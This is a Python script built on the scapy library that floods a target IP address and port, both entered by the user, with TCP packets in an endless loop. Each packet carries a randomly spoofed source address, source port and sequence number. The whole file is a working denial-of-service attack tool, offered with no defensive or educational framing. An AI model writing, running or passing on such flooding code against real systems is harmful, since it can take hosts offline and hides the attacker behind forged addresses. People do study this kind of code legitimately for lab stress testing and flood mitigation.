from scapy.all import *
from scapy.layers.inet import ICMP, TCP, IP
import sys
import random


def Int_generate():
    i = random.randint(1000, 9000)
    return i

def IP_generate():
    ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
    return ip

def flood(dest_ip, dest_port):
    t_pkt = 0
    print("Sending Packets!")
    try:
        count = 0
        while True:
            eq = Int_generate()
            port = Int_generate()


            ip_pkt = IP()
            ip_pkt.src = IP_generate()
            ip_pkt.dst = dest_ip


            tcp_pkt = TCP()
            tcp_pkt.sport = port
            tcp_pkt.dport = dest_port
            tcp_pkt.seq = eq

            send(ip_pkt / tcp_pkt, verbose=0)
            t_pkt += 1
            print("\nPackets sent: %i\n" % t_pkt)
    except KeyboardInterrupt:
        print("\nExited")


if __name__ == "__main__":
    #dest_ip = "192.168.0.178"
    dest_ip = input("\nEnter destination IP : ")
    dest_port = input("\nEnter destination port : ")
    flood(dest_ip, int(dest_port))